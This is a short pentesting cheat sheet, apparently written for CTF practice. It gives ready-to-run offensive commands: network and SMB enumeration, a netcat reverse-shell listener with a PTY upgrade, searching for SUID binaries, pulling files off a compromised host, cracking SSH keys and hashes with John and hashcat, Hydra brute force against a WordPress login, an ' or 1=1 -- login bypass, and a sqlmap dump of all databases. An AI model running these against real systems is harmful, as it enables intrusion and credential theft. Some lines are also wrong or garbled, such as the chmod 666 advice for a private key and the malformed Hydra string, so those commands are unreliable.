# _**Some Important Notes**_

-------------------------------------------------------------------------------------------

`verison` 
`1.1.2`

-------------------------------------------------------------------------------------------


`General Nmap Scan`


	nmap -sV -A {machine IP} 


`If ping is being blocked`

	nmap -sV -A {machine IP} -Pn


------------------------------------------------------------------------------------------

`Gobuster`

	gobuster dir -u http://machineip -w wordlists


--------------------------------------------------------------------------------------------

`rust scan`


	rustscan -a {machine IP} -- -A -sC -sV

-------------------------------------------------------------------------------------------------


`enum4linux`

	./enum4linux.pl -U {machine IP} 

`or also -S be used`

	./enum4linux.pl -S {machine IP}

-----------------------------------------------------------------------------------------------

`subclient`

	smbclient //{machine IP}

--------------------------------------------------------------------------------------------

`SUID permission`

	find / -perm -u=s -type f 2>/dev/null


----------------------------------------------------------------------------------------------

`Download From Reverse Shell`

`In Reverese shell`

	python3 -m http.server {port}

`In local Machine`

	wget machineip:8000/file.name


`for directory` `sometimes`

	wget --recursive --no-parent  10.10.46.113:8000/{directory}

------------------------------------------------------------------------------------------------------

`linpeas.sh`

	linpeas.sh is the best script for previlage escilation


-------------------------------------------------------------------------------------------------------

`FTP download/upload`

	get -> download file
	put -> upload file

-------------------------------------------------------------------------------------------------------

`sql injection` 
`login bypass`

	 username: ' or 1=1 --
	 password: anything

---------------------------------------------------------------------------------------------------

`netcat`

	nc -nvlp {port}

-------------------------------------------------------------------------------------------------

`PTY shell upgrade`
`Stable Reverse Shell connnection`

        python3 -c 'import pty; pty.spawn("/bin/bash")'

-------------------------------------------------------------------------------------------------
`john the ripper`
`john`

	john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john

-----------------------------------------------------------------------------------------------------

`rsa` 
`ssh2john`

	/usr/share/john/ssh2john.py id_rsa > id_rsa.john 

`then`

       john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john

`john for hash`
	
	john --format=raw-sha1 hash

`ssh2johnhash`

	chmod 666 id_rsa #change mode to initial RSA private key file

`for ssh connection`

	ssh -i id_rsa user@ip 


------------------------------------------------------------------------------------------------------

`hydra`


        hydra -l user -P wordlists.txt {ip} -V http-form-post "page:parameters:string"



`example:`


        hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.208.134 -V http-form-post "wp-login.php:log=^USER^&^PASS^$wp-submit:LogIn&testcookie=1:F=incorrect"


`use burpsuit for rest of info`


-----------------------------------------------------------------------------------------------------


`hashid`

	hashid -m '{hash value}'

`hashcat`

	hashcat -m {mode value from hashid} {hash value} {/wordlists.txt}

-------------------------------------------------------------------------------------------------------------

`sqlmap`

	sqlmap -u http://10.10.71.73 --forms --tamper=space2comment --dump-all -dbms sqlite


# @cc github.com/prakashchand72
